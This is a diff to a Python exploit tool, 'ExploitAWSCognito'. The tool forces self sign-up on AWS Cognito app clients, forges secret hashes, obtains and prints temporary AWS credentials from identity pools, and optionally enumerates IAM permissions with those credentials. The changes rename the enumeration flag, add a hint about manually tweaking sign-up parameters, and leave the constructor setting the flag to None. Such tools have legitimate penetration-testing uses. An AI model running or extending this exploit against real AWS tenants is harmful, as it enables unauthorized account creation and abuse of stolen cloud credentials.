@@ -12,7 +12,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class ExploitAWSCognito:
-	def __init__(self, region, username, password, isenum):
+	def __init__(self, region, username, password, enumiam):
 		self.region = region
 		self.username = username
 		self.password = password
@@ -20,9 +20,9 @@ class ExploitAWSCognito:
 		self.identityPoolId = None
 		self.userPoolId = None
 		self.cognitoSecret = None
-		self.isenum = isenum
+		self.enumiam = None
 
-	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None):
+	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None, enumiam=None):
 		if clientId:
 			self.clientId = clientId
 		if identityPoolId:
@@ -31,6 +31,8 @@ class ExploitAWSCognito:
 			self.userPoolId = userPoolId
 		if cognitoSecret:
 			self.cognitoSecret = cognitoSecret
+		if enumiam:
+			self.enumiam = enumiam
 
 
 	def unauthen_exploit(self):
@@ -42,6 +44,8 @@ class ExploitAWSCognito:
 				self.logProc(f"[+] {self.region}:{self.clientId} - Force SignUp Check stdout: {stdout}")
 			if len(stderr) > 0:
 				self.logError(f"[+] {self.region}:{self.clientId} - Force SignUp Check stderr: {stderr}")
+				if b"InvalidParameterException" in stderr:
+								self.logError(f"[+] {self.region}:{self.clientId} - Might be vuln but you need to manual modify sign up parameter!")
 				if b'is configured for secret but secret was not received' in stderr:
 					if self.cognitoSecret:
 						secret_hash = base64.b64encode(hmac.new(self.cognitoSecret.encode(), msg=f"{self.username}{self.clientId}".encode(), digestmod=hashlib.sha256).digest())
@@ -84,7 +88,7 @@ class ExploitAWSCognito:
 					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SessionToken: {SessionToken}")
 					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - Expiration: {Expiration}")
 
-					if self.isenum:
+					if self.enumiam:
 						enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)
 
 
@@ -121,5 +125,7 @@ if __name__ == "__main__":
 		exploit_instance.update(identityPoolId=args.identity_pool_id.strip())
 	if args.cognito_secret:
 		exploit_instance.update(cognitoSecret=args.cognito_secret.strip())
+	if args.enum_iam:
+		exploit_instance.update(enumiam=args.enum_iam.strip())
 	
 	exploit_instance.unauthen_exploit()
